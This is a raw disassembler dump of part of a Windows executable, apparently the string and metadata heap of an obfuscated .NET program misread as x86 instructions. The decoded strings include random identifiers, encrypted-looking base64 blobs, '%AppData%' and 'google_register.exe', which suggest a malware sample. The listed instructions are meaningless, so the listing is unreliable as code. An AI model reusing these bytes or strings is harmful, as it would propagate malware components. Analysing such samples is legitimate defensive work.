  409e3f:	69 6c 79 00 69 7a 53 	imul   $0x41537a69,0x0(%ecx,%edi,2),%ebp
  409e46:	41 
  409e47:	6a 63                	push   $0x63
  409e49:	70 54                	jo     0x409e9f
  409e4b:	6a 6c                	push   $0x6c
  409e4d:	79 00                	jns    0x409e4f
  409e4f:	42                   	inc    %edx
  409e50:	6c                   	insb   (%dx),%es:(%edi)
  409e51:	6f                   	outsl  %ds:(%esi),(%dx)
  409e52:	63 6b 43             	arpl   %ebp,0x43(%ebx)
  409e55:	6f                   	outsl  %ds:(%esi),(%dx)
  409e56:	70 79                	jo     0x409ed1
  409e58:	00 50 49             	add    %dl,0x49(%eax)
  409e5b:	77 56                	ja     0x409eb3
  409e5d:	78 49                	js     0x409ea8
  409e5f:	4d                   	dec    %ebp
  409e60:	74 71                	je     0x409ed3
  409e62:	79 00                	jns    0x409e64
  409e64:	54                   	push   %esp
  409e65:	6f                   	outsl  %ds:(%esi),(%dx)
  409e66:	42                   	inc    %edx
  409e67:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409e6e:	65 74 5f             	gs je  0x409ed0
  409e71:	53                   	push   %ebx
  409e72:	79 73                	jns    0x409ee7
  409e74:	74 65                	je     0x409edb
  409e76:	6d                   	insl   (%dx),%es:(%edi)
  409e77:	44                   	inc    %esp
  409e78:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409e7f:	79 00                	jns    0x409e81
  409e81:	52                   	push   %edx
  409e82:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  409e89:	00 6f 
  409e8b:	70 5f                	jo     0x409eec
  409e8d:	45                   	inc    %ebp
  409e8e:	71 75                	jno    0x409f05
  409e90:	61                   	popa
  409e91:	6c                   	insb   (%dx),%es:(%edi)
  409e92:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  409e99:	49 
  409e9a:	6e                   	outsb  %ds:(%esi),(%dx)
  409e9b:	65 71 75             	gs jno 0x409f13
  409e9e:	61                   	popa
  409e9f:	6c                   	insb   (%dx),%es:(%edi)
  409ea0:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  409ea7:	74 
  409ea8:	65 6d                	gs insl (%dx),%es:(%edi)
  409eaa:	2e 4e                	cs dec %esi
  409eac:	65 74 2e             	gs je  0x409edd
  409eaf:	53                   	push   %ebx
  409eb0:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409eb4:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  409ebb:	64 
  409ebc:	6f                   	outsl  %ds:(%esi),(%dx)
  409ebd:	77 73                	ja     0x409f32
  409ebf:	49                   	dec    %ecx
  409ec0:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409ec3:	74 69                	je     0x409f2e
  409ec5:	74 79                	je     0x409f40
  409ec7:	00 49 73             	add    %cl,0x73(%ecx)
  409eca:	4e                   	dec    %esi
  409ecb:	75 6c                	jne    0x409f39
  409ecd:	6c                   	insb   (%dx),%es:(%edi)
  409ece:	4f                   	dec    %edi
  409ecf:	72 45                	jb     0x409f16
  409ed1:	6d                   	insl   (%dx),%es:(%edi)
  409ed2:	70 74                	jo     0x409f48
  409ed4:	79 00                	jns    0x409ed6
  409ed6:	5a                   	pop    %edx
  409ed7:	56                   	push   %esi
  409ed8:	7a 57                	jp     0x409f31
  409eda:	44                   	inc    %esp
  409edb:	41                   	inc    %ecx
  409edc:	56                   	push   %esi
  409edd:	6b 56 7a 79          	imul   $0x79,0x7a(%esi),%edx
  409ee1:	00 57 6d             	add    %dl,0x6d(%edi)
  409ee4:	47                   	inc    %edi
  409ee5:	67 62 6f 74          	bound  %ebp,0x74(%bx)
  409ee9:	63 6b 78             	arpl   %ebp,0x78(%ebx)
  409eec:	7a 68                	jp     0x409f56
  409eee:	46                   	inc    %esi
  409eef:	7a 00                	jp     0x409ef1
  409ef1:	50                   	push   %eax
  409ef2:	4a                   	dec    %edx
  409ef3:	41                   	inc    %ecx
  409ef4:	53                   	push   %ebx
  409ef5:	7a 67                	jp     0x409f5e
  409ef7:	67 70 44             	addr16 jo 0x409f3e
  409efa:	48                   	dec    %eax
  409efb:	7a 00                	jp     0x409efd
  409efd:	6c                   	insb   (%dx),%es:(%edi)
  409efe:	58                   	pop    %eax
  409eff:	42                   	inc    %edx
  409f00:	46                   	inc    %esi
  409f01:	45                   	inc    %ebp
  409f02:	71 57                	jno    0x409f5b
  409f04:	44                   	inc    %esp
  409f05:	4e                   	dec    %esi
  409f06:	52                   	push   %edx
  409f07:	7a 00                	jp     0x409f09
  409f09:	41                   	inc    %ecx
  409f0a:	46                   	inc    %esi
  409f0b:	54                   	push   %esp
  409f0c:	66 47                	inc    %di
  409f0e:	50                   	push   %eax
  409f0f:	4d                   	dec    %ebp
  409f10:	66 64 61             	fs popaw
  409f13:	7a 00                	jp     0x409f15
  409f15:	50                   	push   %eax
  409f16:	45                   	inc    %ebp
  409f17:	66 54                	push   %sp
  409f19:	72 52                	jb     0x409f6d
  409f1b:	49                   	dec    %ecx
  409f1c:	41                   	inc    %ecx
  409f1d:	63 7a 00             	arpl   %edi,0x0(%edx)
  409f20:	62 6c 67 51          	bound  %ebp,0x51(%edi,%eiz,2)
  409f24:	63 4f 66             	arpl   %ecx,0x66(%edi)
  409f27:	41                   	inc    %ecx
  409f28:	52                   	push   %edx
  409f29:	41                   	inc    %ecx
  409f2a:	79 67                	jns    0x409f93
  409f2c:	61                   	popa
  409f2d:	64 7a 00             	fs jp  0x409f30
  409f30:	41                   	inc    %ecx
  409f31:	77 79                	ja     0x409fac
  409f33:	79 48                	jns    0x409f7d
  409f35:	67 64 68 41 56 7a 4e 	addr16 fs push $0x4e7a5641
  409f3c:	6b 7a 00 00          	imul   $0x0,0x0(%edx),%edi
  409f40:	00 0d 53 00 48 00    	add    %cl,0x480053
  409f46:	41                   	inc    %ecx
  409f47:	00 32                	add    %dh,(%edx)
  409f49:	00 35 00 36 00 00    	add    %dh,0x3600
  409f4f:	81 59 4d 00 56 00 36 	sbbl   $0x36005600,0x4d(%ecx)
  409f56:	00 4b 00             	add    %cl,0x0(%ebx)
  409f59:	4a                   	dec    %edx
  409f5a:	00 77 00             	add    %dh,0x0(%edi)
  409f5d:	36 00 4a 00          	add    %cl,%ss:0x0(%edx)
  409f61:	50                   	push   %eax
  409f62:	00 67 00             	add    %ah,0x0(%edi)
  409f65:	31 00                	xor    %eax,(%eax)
  409f67:	6f                   	outsl  %ds:(%esi),(%dx)
  409f68:	00 6a 00             	add    %ch,0x0(%edx)
  409f6b:	45                   	inc    %ebp
  409f6c:	00 46 00             	add    %al,0x0(%esi)
  409f6f:	4e                   	dec    %esi
  409f70:	00 76 00             	add    %dh,0x0(%esi)
  409f73:	66 00 4c 00 68       	data16 add %cl,0x68(%eax,%eax,1)
  409f78:	00 56 00             	add    %dl,0x0(%esi)
  409f7b:	51                   	push   %ecx
  409f7c:	00 72 00             	add    %dh,0x0(%edx)
  409f7f:	55                   	push   %ebp
  409f80:	00 78 00             	add    %bh,0x0(%eax)
  409f83:	74 00                	je     0x409f85
  409f85:	44                   	inc    %esp
  409f86:	00 59 00             	add    %bl,0x0(%ecx)
  409f89:	53                   	push   %ebx
  409f8a:	00 6d 00             	add    %ch,0x0(%ebp)
  409f8d:	49                   	dec    %ecx
  409f8e:	00 30                	add    %dh,(%eax)
  409f90:	00 6a 00             	add    %ch,0x0(%edx)
  409f93:	31 00                	xor    %eax,(%eax)
  409f95:	53                   	push   %ebx
  409f96:	00 78 00             	add    %bh,0x0(%eax)
  409f99:	62 00                	bound  %eax,(%eax)
  409f9b:	4e                   	dec    %esi
  409f9c:	00 4d 00             	add    %cl,0x0(%ebp)
  409f9f:	32 00                	xor    (%eax),%al
  409fa1:	44                   	inc    %esp
  409fa2:	00 70 00             	add    %dh,0x0(%eax)
  409fa5:	50                   	push   %eax
  409fa6:	00 37                	add    %dh,(%edi)
  409fa8:	00 49 00             	add    %cl,0x0(%ecx)
  409fab:	43                   	inc    %ebx
  409fac:	00 59 00             	add    %bl,0x0(%ecx)
  409faf:	65 00 34 00          	add    %dh,%gs:(%eax,%eax,1)
  409fb3:	42                   	inc    %edx
  409fb4:	00 4c 00 31          	add    %cl,0x31(%eax,%eax,1)
  409fb8:	00 32                	add    %dh,(%edx)
  409fba:	00 72 00             	add    %dh,0x0(%edx)
  409fbd:	52                   	push   %edx
  409fbe:	00 76 00             	add    %dh,0x0(%esi)
  409fc1:	36 00 6d 00          	add    %ch,%ss:0x0(%ebp)
  409fc5:	62 00                	bound  %eax,(%eax)
  409fc7:	6d                   	insl   (%dx),%es:(%edi)
  409fc8:	00 6a 00             	add    %ch,0x0(%edx)
  409fcb:	53                   	push   %ebx
  409fcc:	00 4c 00 76          	add    %cl,0x76(%eax,%eax,1)
  409fd0:	00 78 00             	add    %bh,0x0(%eax)
  409fd3:	6c                   	insb   (%dx),%es:(%edi)
  409fd4:	00 68 00             	add    %ch,0x0(%eax)
  409fd7:	32 00                	xor    (%eax),%al
  409fd9:	48                   	dec    %eax
  409fda:	00 37                	add    %dh,(%edi)
  409fdc:	00 64 00 2b          	add    %ah,0x2b(%eax,%eax,1)
  409fe0:	00 49 00             	add    %cl,0x0(%ecx)
  409fe3:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  409fe7:	33 00                	xor    (%eax),%eax
  409fe9:	31 00                	xor    %eax,(%eax)
  409feb:	42                   	inc    %edx
  409fec:	00 4a 00             	add    %cl,0x0(%edx)
  409fef:	30 00                	xor    %al,(%eax)
  409ff1:	32 00                	xor    (%eax),%al
  409ff3:	45                   	inc    %ebp
  409ff4:	00 76 00             	add    %dh,0x0(%esi)
  409ff7:	33 00                	xor    (%eax),%eax
  409ff9:	49                   	dec    %ecx
  409ffa:	00 56 00             	add    %dl,0x0(%esi)
  409ffd:	4f                   	dec    %edi
  409ffe:	00 33                	add    %dh,(%ebx)
  40a000:	00 62 00             	add    %ah,0x0(%edx)
  40a003:	54                   	push   %esp
  40a004:	00 4d 00             	add    %cl,0x0(%ebp)
  40a007:	4d                   	dec    %ebp
  40a008:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40a00c:	00 55 00             	add    %dl,0x0(%ebp)
  40a00f:	32 00                	xor    (%eax),%al
  40a011:	42                   	inc    %edx
  40a012:	00 54 00 4f          	add    %dl,0x4f(%eax,%eax,1)
  40a016:	00 4c 00 6d          	add    %cl,0x6d(%eax,%eax,1)
  40a01a:	00 73 00             	add    %dh,0x0(%ebx)
  40a01d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a01e:	00 2f                	add    %ch,(%edi)
  40a020:	00 7a 00             	add    %bh,0x0(%edx)
  40a023:	77 00                	ja     0x40a025
  40a025:	59                   	pop    %ecx
  40a026:	00 66 00             	add    %ah,0x0(%esi)
  40a029:	39 00                	cmp    %eax,(%eax)
  40a02b:	61                   	popa
  40a02c:	00 45 00             	add    %al,0x0(%ebp)
  40a02f:	33 00                	xor    (%eax),%eax
  40a031:	41                   	inc    %ecx
  40a032:	00 6b 00             	add    %ch,0x0(%ebx)
  40a035:	45                   	inc    %ebp
  40a036:	00 66 00             	add    %ah,0x0(%esi)
  40a039:	2b 00                	sub    (%eax),%eax
  40a03b:	77 00                	ja     0x40a03d
  40a03d:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40a041:	66 00 78 00          	data16 add %bh,0x0(%eax)
  40a045:	34 00                	xor    $0x0,%al
  40a047:	74 00                	je     0x40a049
  40a049:	66 00 74 00 4c       	data16 add %dh,0x4c(%eax,%eax,1)
  40a04e:	00 47 00             	add    %al,0x0(%edi)
  40a051:	6a 00                	push   $0x0
  40a053:	6f                   	outsl  %ds:(%esi),(%dx)
  40a054:	00 7a 00             	add    %bh,0x0(%edx)
  40a057:	6c                   	insb   (%dx),%es:(%edi)
  40a058:	00 7a 00             	add    %bh,0x0(%edx)
  40a05b:	56                   	push   %esi
  40a05c:	00 6f 00             	add    %ch,0x0(%edi)
  40a05f:	55                   	push   %ebp
  40a060:	00 35 00 50 00 55    	add    %dh,0x55005000
  40a066:	00 6e 00             	add    %ch,0x0(%esi)
  40a069:	67 00 48 00          	add    %cl,0x0(%bx,%si)
  40a06d:	5a                   	pop    %edx
  40a06e:	00 68 00             	add    %ch,0x0(%eax)
  40a071:	69 00 69 00 30 00    	imul   $0x300069,(%eax),%eax
  40a077:	42                   	inc    %edx
  40a078:	00 55 00             	add    %dl,0x0(%ebp)
  40a07b:	6d                   	insl   (%dx),%es:(%edi)
  40a07c:	00 43 00             	add    %al,0x0(%ebx)
  40a07f:	41                   	inc    %ecx
  40a080:	00 62 00             	add    %ah,0x0(%edx)
  40a083:	79 00                	jns    0x40a085
  40a085:	6e                   	outsb  %ds:(%esi),(%dx)
  40a086:	00 48 00             	add    %cl,0x0(%eax)
  40a089:	4a                   	dec    %edx
  40a08a:	00 66 00             	add    %ah,0x0(%esi)
  40a08d:	72 00                	jb     0x40a08f
  40a08f:	7a 00                	jp     0x40a091
  40a091:	42                   	inc    %edx
  40a092:	00 41 00             	add    %al,0x0(%ecx)
  40a095:	51                   	push   %ecx
  40a096:	00 4a 00             	add    %cl,0x0(%edx)
  40a099:	77 00                	ja     0x40a09b
  40a09b:	4f                   	dec    %edi
  40a09c:	00 65 00             	add    %ah,0x0(%ebp)
  40a09f:	52                   	push   %edx
  40a0a0:	00 55 00             	add    %dl,0x0(%ebp)
  40a0a3:	30 00                	xor    %al,(%eax)
  40a0a5:	4d                   	dec    %ebp
  40a0a6:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40a0ac:	79 00                	jns    0x40a0ae
  40a0ae:	76 00                	jbe    0x40a0b0
  40a0b0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0b1:	00 79 00             	add    %bh,0x0(%ecx)
  40a0b4:	5a                   	pop    %edx
  40a0b5:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40a0b9:	00 6d 00             	add    %ch,0x0(%ebp)
  40a0bc:	51                   	push   %ecx
  40a0bd:	00 69 00             	add    %ch,0x0(%ecx)
  40a0c0:	42                   	inc    %edx
  40a0c1:	00 36                	add    %dh,(%esi)
  40a0c3:	00 38                	add    %bh,(%eax)
  40a0c5:	00 30                	add    %dh,(%eax)
  40a0c7:	00 77 00             	add    %dh,0x0(%edi)
  40a0ca:	6d                   	insl   (%dx),%es:(%edi)
  40a0cb:	00 51 00             	add    %dl,0x0(%ecx)
  40a0ce:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40a0d2:	49                   	dec    %ecx
  40a0d3:	00 4b 00             	add    %cl,0x0(%ebx)
  40a0d6:	4e                   	dec    %esi
  40a0d7:	00 39                	add    %bh,(%ecx)
  40a0d9:	00 2b                	add    %ch,(%ebx)
  40a0db:	00 36                	add    %dh,(%esi)
  40a0dd:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a0e0:	70 00                	jo     0x40a0e2
  40a0e2:	57                   	push   %edi
  40a0e3:	00 7a 00             	add    %bh,0x0(%edx)
  40a0e6:	53                   	push   %ebx
  40a0e7:	00 37                	add    %dh,(%edi)
  40a0e9:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
  40a0ed:	00 77 00             	add    %dh,0x0(%edi)
  40a0f0:	78 00                	js     0x40a0f2
  40a0f2:	58                   	pop    %eax
  40a0f3:	00 73 00             	add    %dh,0x0(%ebx)
  40a0f6:	44                   	inc    %esp
  40a0f7:	00 39                	add    %bh,(%ecx)
  40a0f9:	00 53 00             	add    %dl,0x0(%ebx)
  40a0fc:	39 00                	cmp    %eax,(%eax)
  40a0fe:	61                   	popa
  40a0ff:	00 75 00             	add    %dh,0x0(%ebp)
  40a102:	62 00                	bound  %eax,(%eax)
  40a104:	4b                   	dec    %ebx
  40a105:	00 51 00             	add    %dl,0x0(%ecx)
  40a108:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  40a10c:	69 00 2b 00 76 00    	imul   $0x76002b,(%eax),%eax
  40a112:	72 00                	jb     0x40a114
  40a114:	41                   	inc    %ecx
  40a115:	00 77 00             	add    %dh,0x0(%edi)
  40a118:	7a 00                	jp     0x40a11a
  40a11a:	7a 00                	jp     0x40a11c
  40a11c:	74 00                	je     0x40a11e
  40a11e:	66 00 4f 00          	data16 add %cl,0x0(%edi)
  40a122:	6a 00                	push   $0x0
  40a124:	77 00                	ja     0x40a126
  40a126:	72 00                	jb     0x40a128
  40a128:	75 00                	jne    0x40a12a
  40a12a:	4b                   	dec    %ebx
  40a12b:	00 46 00             	add    %al,0x0(%esi)
  40a12e:	74 00                	je     0x40a130
  40a130:	66 00 55 00          	data16 add %dl,0x0(%ebp)
  40a134:	44                   	inc    %esp
  40a135:	00 54 00 79          	add    %dl,0x79(%eax,%eax,1)
  40a139:	00 4d 00             	add    %cl,0x0(%ebp)
  40a13c:	67 00 52 00          	add    %dl,0x0(%bp,%si)
  40a140:	35 00 51 00 79       	xor    $0x79005100,%eax
  40a145:	00 6d 00             	add    %ch,0x0(%ebp)
  40a148:	4b                   	dec    %ebx
  40a149:	00 68 00             	add    %ch,0x0(%eax)
  40a14c:	52                   	push   %edx
  40a14d:	00 75 00             	add    %dh,0x0(%ebp)
  40a150:	6c                   	insb   (%dx),%es:(%edi)
  40a151:	00 38                	add    %bh,(%eax)
  40a153:	00 46 00             	add    %al,0x0(%esi)
  40a156:	41                   	inc    %ecx
  40a157:	00 3d 00 3d 00 00    	add    %bh,0x3d00
  40a15d:	80 b1 67 00 45 00 30 	xorb   $0x30,0x450067(%ecx)
  40a164:	00 53 00             	add    %dl,0x0(%ebx)
  40a167:	77 00                	ja     0x40a169
  40a169:	57                   	push   %edi
  40a16a:	00 50 00             	add    %dl,0x0(%eax)
  40a16d:	4c                   	dec    %esp
  40a16e:	00 78 00             	add    %bh,0x0(%eax)
  40a171:	4b                   	dec    %ebx
  40a172:	00 77 00             	add    %dh,0x0(%edi)
  40a175:	34 00                	xor    $0x0,%al
  40a177:	75 00                	jne    0x40a179
  40a179:	55                   	push   %ebp
  40a17a:	00 31                	add    %dh,(%ecx)
  40a17c:	00 39                	add    %bh,(%ecx)
  40a17e:	00 59 00             	add    %bl,0x0(%ecx)
  40a181:	67 00 2f             	add    %ch,(%bx)
  40a184:	00 4a 00             	add    %cl,0x0(%edx)
  40a187:	42                   	inc    %edx
  40a188:	00 49 00             	add    %cl,0x0(%ecx)
  40a18b:	2b 00                	sub    (%eax),%eax
  40a18d:	41                   	inc    %ecx
  40a18e:	00 61 00             	add    %ah,0x0(%ecx)
  40a191:	6d                   	insl   (%dx),%es:(%edi)
  40a192:	00 63 00             	add    %ah,0x0(%ebx)
  40a195:	64 00 52 00          	add    %dl,%fs:0x0(%edx)
  40a199:	68 00 71 00 61       	push   $0x61007100
  40a19e:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  40a1a2:	00 32                	add    %dh,(%edx)
  40a1a4:	00 35 00 71 00 52    	add    %dh,0x52007100
  40a1aa:	00 42 00             	add    %al,0x0(%edx)
  40a1ad:	36 00 74 00 2b       	add    %dh,%ss:0x2b(%eax,%eax,1)
  40a1b2:	00 2f                	add    %ch,(%edi)
  40a1b4:	00 50 00             	add    %dl,0x0(%eax)
  40a1b7:	63 00                	arpl   %eax,(%eax)
  40a1b9:	4b                   	dec    %ebx
  40a1ba:	00 49 00             	add    %cl,0x0(%ecx)
  40a1bd:	51                   	push   %ecx
  40a1be:	00 44 00 32          	add    %al,0x32(%eax,%eax,1)
  40a1c2:	00 6a 00             	add    %ch,0x0(%edx)
  40a1c5:	74 00                	je     0x40a1c7
  40a1c7:	43                   	inc    %ebx
  40a1c8:	00 58 00             	add    %bl,0x0(%eax)
  40a1cb:	4e                   	dec    %esi
  40a1cc:	00 75 00             	add    %dh,0x0(%ebp)
  40a1cf:	6b 00 59             	imul   $0x59,(%eax),%eax
  40a1d2:	00 6d 00             	add    %ch,0x0(%ebp)
  40a1d5:	2f                   	das
  40a1d6:	00 72 00             	add    %dh,0x0(%edx)
  40a1d9:	4e                   	dec    %esi
  40a1da:	00 4f 00             	add    %cl,0x0(%edi)
  40a1dd:	50                   	push   %eax
  40a1de:	00 6a 00             	add    %ch,0x0(%edx)
  40a1e1:	66 00 2b             	data16 add %ch,(%ebx)
  40a1e4:	00 43 00             	add    %al,0x0(%ebx)
  40a1e7:	66 00 4e 00          	data16 add %cl,0x0(%esi)
  40a1eb:	46                   	inc    %esi
  40a1ec:	00 53 00             	add    %dl,0x0(%ebx)
  40a1ef:	48                   	dec    %eax
  40a1f0:	00 65 00             	add    %ah,0x0(%ebp)
  40a1f3:	57                   	push   %edi
  40a1f4:	00 53 00             	add    %dl,0x0(%ebx)
  40a1f7:	6c                   	insb   (%dx),%es:(%edi)
  40a1f8:	00 59 00             	add    %bl,0x0(%ecx)
  40a1fb:	52                   	push   %edx
  40a1fc:	00 67 00             	add    %ah,0x0(%edi)
  40a1ff:	4d                   	dec    %ebp
  40a200:	00 47 00             	add    %al,0x0(%edi)
  40a203:	2b 00                	sub    (%eax),%eax
  40a205:	53                   	push   %ebx
  40a206:	00 6b 00             	add    %ch,0x0(%ebx)
  40a209:	67 00 3d             	add    %bh,(%di)
  40a20c:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40a212:	7a 00                	jp     0x40a214
  40a214:	2b 00                	sub    (%eax),%eax
  40a216:	74 00                	je     0x40a218
  40a218:	35 00 7a 00 59       	xor    $0x59007a00,%eax
  40a21d:	00 2b                	add    %ch,(%ebx)
  40a21f:	00 6f 00             	add    %ch,0x0(%edi)
  40a222:	63 00                	arpl   %eax,(%eax)
  40a224:	6c                   	insb   (%dx),%es:(%edi)
  40a225:	00 4b 00             	add    %cl,0x0(%ebx)
  40a228:	47                   	inc    %edi
  40a229:	00 4f 00             	add    %cl,0x0(%edi)
  40a22c:	52                   	push   %edx
  40a22d:	00 2f                	add    %ch,(%edi)
  40a22f:	00 6c 00 44          	add    %ch,0x44(%eax,%eax,1)
  40a233:	00 45 00             	add    %al,0x0(%ebp)
  40a236:	57                   	push   %edi
  40a237:	00 4f 00             	add    %cl,0x0(%edi)
  40a23a:	69 00 71 00 76 00    	imul   $0x760071,(%eax),%eax
  40a240:	47                   	inc    %edi
  40a241:	00 31                	add    %dh,(%ecx)
  40a243:	00 6b 00             	add    %ch,0x0(%ebx)
  40a246:	52                   	push   %edx
  40a247:	00 2b                	add    %ch,(%ebx)
  40a249:	00 37                	add    %dh,(%edi)
  40a24b:	00 70 00             	add    %dh,0x0(%eax)
  40a24e:	78 00                	js     0x40a250
  40a250:	79 00                	jns    0x40a252
  40a252:	7a 00                	jp     0x40a254
  40a254:	4f                   	dec    %edi
  40a255:	00 48 00             	add    %cl,0x0(%eax)
  40a258:	56                   	push   %esi
  40a259:	00 4c 00 38          	add    %cl,0x38(%eax,%eax,1)
  40a25d:	00 50 00             	add    %dl,0x0(%eax)
  40a260:	4f                   	dec    %edi
  40a261:	00 4d 00             	add    %cl,0x0(%ebp)
  40a264:	76 00                	jbe    0x40a266
  40a266:	6f                   	outsl  %ds:(%esi),(%dx)
  40a267:	00 2b                	add    %ch,(%ebx)
  40a269:	00 39                	add    %bh,(%ecx)
  40a26b:	00 45 00             	add    %al,0x0(%ebp)
  40a26e:	37                   	aaa
  40a26f:	00 66 00             	add    %ah,0x0(%esi)
  40a272:	50                   	push   %eax
  40a273:	00 71 00             	add    %dh,0x0(%ecx)
  40a276:	70 00                	jo     0x40a278
  40a278:	70 00                	jo     0x40a27a
  40a27a:	78 00                	js     0x40a27c
  40a27c:	36 00 7a 00          	add    %bh,%ss:0x0(%edx)
  40a280:	4a                   	dec    %edx
  40a281:	00 36                	add    %dh,(%esi)
  40a283:	00 35 00 32 00 30    	add    %dh,0x30003200
  40a289:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  40a28d:	00 78 00             	add    %bh,0x0(%eax)
  40a290:	31 00                	xor    %eax,(%eax)
  40a292:	63 00                	arpl   %eax,(%eax)
  40a294:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40a298:	4a                   	dec    %edx
  40a299:	00 53 00             	add    %dl,0x0(%ebx)
  40a29c:	43                   	inc    %ebx
  40a29d:	00 4d 00             	add    %cl,0x0(%ebp)
  40a2a0:	49                   	dec    %ecx
  40a2a1:	00 63 00             	add    %ah,0x0(%ebx)
  40a2a4:	42                   	inc    %edx
  40a2a5:	00 6d 00             	add    %ch,0x0(%ebp)
  40a2a8:	63 00                	arpl   %eax,(%eax)
  40a2aa:	31 00                	xor    %eax,(%eax)
  40a2ac:	72 00                	jb     0x40a2ae
  40a2ae:	67 00 79 00          	add    %bh,0x0(%bx,%di)
  40a2b2:	38 00                	cmp    %al,(%eax)
  40a2b4:	4f                   	dec    %edi
  40a2b5:	00 5a 00             	add    %bl,0x0(%edx)
  40a2b8:	43                   	inc    %ebx
  40a2b9:	00 6e 00             	add    %ch,0x0(%esi)
  40a2bc:	67 00 3d             	add    %bh,(%di)
  40a2bf:	00 3d 00 00 13 25    	add    %bh,0x25130000
  40a2c5:	00 41 00             	add    %al,0x0(%ecx)
  40a2c8:	70 00                	jo     0x40a2ca
  40a2ca:	70 00                	jo     0x40a2cc
  40a2cc:	44                   	inc    %esp
  40a2cd:	00 61 00             	add    %ah,0x0(%ecx)
  40a2d0:	74 00                	je     0x40a2d2
  40a2d2:	61                   	popa
  40a2d3:	00 25 00 00 27 67    	add    %ah,0x67270000
  40a2d9:	00 6f 00             	add    %ch,0x0(%edi)
  40a2dc:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2dd:	00 67 00             	add    %ah,0x0(%edi)
  40a2e0:	6c                   	insb   (%dx),%es:(%edi)
  40a2e1:	00 65 00             	add    %ah,0x0(%ebp)
  40a2e4:	5f                   	pop    %edi
  40a2e5:	00 72 00             	add    %dh,0x0(%edx)
  40a2e8:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40a2ec:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
  40a2f2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a2f6:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40a2fa:	78 00                	js     0x40a2fc
  40a2fc:	65 00 00             	add    %al,%gs:(%eax)
  40a2ff:	59                   	pop    %ecx
  40a300:	55                   	push   %ebp
  40a301:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
  40a305:	00 56 00             	add    %dl,0x0(%esi)
  40a308:	63 00                	arpl   %eax,(%eax)
  40a30a:	44                   	inc    %esp
  40a30b:	00 4a 00             	add    %cl,0x0(%edx)
  40a30e:	55                   	push   %ebp
  40a30f:	00 55 00             	add    %dl,0x0(%ebp)
  40a312:	47                   	inc    %edi
  40a313:	00 70 00             	add    %dh,0x0(%eax)
  40a316:	6a 00                	push   $0x0
  40a318:	53                   	push   %ebx
  40a319:	00 6a 00             	add    %ch,0x0(%edx)
  40a31c:	52                   	push   %edx
  40a31d:	00 79 00             	add    %bh,0x0(%ecx)
  40a320:	4f                   	dec    %edi
  40a321:	00 56 00             	add    %dl,0x0(%esi)
  40a324:	42                   	inc    %edx
  40a325:	00 7a 00             	add    %bh,0x0(%edx)
  40a328:	4d                   	dec    %ebp
  40a329:	00 6b 00             	add    %ch,0x0(%ebx)
  40a32c:	31 00                	xor    %eax,(%eax)
  40a32e:	4a                   	dec    %edx
  40a32f:	00 62 00             	add    %ah,0x0(%edx)
  40a332:	6a 00                	push   $0x0
  40a334:	42                   	inc    %edx
  40a335:	00 35 00 59 00 56    	add    %dh,0x56005900
  40a33b:	00 46 00             	add    %al,0x0(%esi)
  40a33e:	56                   	push   %esi
  40a33f:	00 4d 00             	add    %cl,0x0(%ebp)
  40a342:	57                   	push   %edi
  40a343:	00 49 00             	add    %cl,0x0(%ecx)
  40a346:	79 00                	jns    0x40a348
  40a348:	5a                   	pop    %edx
  40a349:	00 6a 00             	add    %ch,0x0(%edx)
  40a34c:	46                   	inc    %esi
  40a34d:	00 53 00             	add    %dl,0x0(%ebx)
  40a350:	57                   	push   %edi
  40a351:	00 48 00             	add    %cl,0x0(%eax)
  40a354:	45                   	inc    %ebp
  40a355:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40a35b:	7a 00                	jp     0x40a35d
  40a35d:	35 00 2b 00 4d       	xor    $0x4d002b00,%eax
  40a362:	00 52 00             	add    %dl,0x0(%edx)
  40a365:	34 00                	xor    $0x0,%al
  40a367:	56                   	push   %esi
  40a368:	00 7a 00             	add    %bh,0x0(%edx)
  40a36b:	64 00 39             	add    %bh,%fs:(%ecx)
  40a36e:	00 64 00 39          	add    %ah,0x39(%eax,%eax,1)
  40a372:	00 47 00             	add    %al,0x0(%edi)
  40a375:	32 00                	xor    (%eax),%al
  40a377:	33 00                	xor    (%eax),%eax
  40a379:	73 00                	jae    0x40a37b
  40a37b:	47                   	inc    %edi
  40a37c:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  40a380:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a383:	6b 00 78             	imul   $0x78,(%eax),%eax
  40a386:	00 78 00             	add    %bh,0x0(%eax)
  40a389:	4d                   	dec    %ebp
  40a38a:	00 4f 00             	add    %cl,0x0(%edi)
  40a38d:	66 00 4b 00          	data16 add %cl,0x0(%ebx)
  40a391:	45                   	inc    %ebp
  40a392:	00 74 00 39          	add    %dh,0x39(%eax,%eax,1)
  40a396:	00 30                	add    %dh,(%eax)
  40a398:	00 6f 00             	add    %ch,0x0(%edi)
  40a39b:	59                   	pop    %ecx
